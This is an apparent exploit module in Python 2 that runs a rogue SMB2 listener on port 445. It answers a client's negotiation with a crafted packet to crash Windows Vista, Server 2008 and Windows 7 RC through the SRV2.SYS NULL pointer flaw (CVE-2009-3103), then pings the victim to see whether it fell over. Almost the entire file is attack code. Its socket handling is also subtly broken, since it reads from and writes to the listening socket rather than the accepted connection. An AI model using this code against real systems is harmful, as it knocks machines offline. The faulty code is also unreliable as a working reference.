import socket, commands
import re

#
# Exploit a NULL pointer dereference in SRV2.SYS kernel driver.  Triggers a DoS on Vista Sp1/Sp2/Server 2008/sp2
# and Windows 7 RC (unconfirmed on 7 sp1)
# More: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2009-3103
#
def initialize():
	try:
		print '[!] Preparing SMB2 listener...'
		pkt =("\x00\x00\x00\x01")
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		# bind and listen for a connection 
		sock.bind(("", 445))
		try:
			print '[!] Waiting for connection...'
			sock.listen(1)
		except KeyboardInterrupt:
			return
		connection, addr = sock.accept()
		print '[!] Connection from %s, waiting for negotiation...'%str(addr)
		while True:
			try:
				npkt = sock.recv(1024)
				# we're responding to the negotiation packet
				if npkt[8] == 'r':
					sock.send(pkt)
					break	
			except Exception, j:
				print '[-] Connection error [%s]'%j
				break
		sock.close()
		print '[!] Complete, checking remote address...'
		rval = commands.getoutput('ping -c 1 -w 1 %s'%addr[0])
		up = re.search('\d.*? received', rval)
		if re.search('0', up.group(0)) is None:
			print '[-] Host appears to be up'
		else:
			print '[+] Host is not responding - it is either down or rejecting our probes.'
	except Exception, j:
		print '[dbg] Error: ', j		
		print '[-] Remote host not susceptible to vulnerability.'
		return

#
#
#
def info():
	print 'none yet'
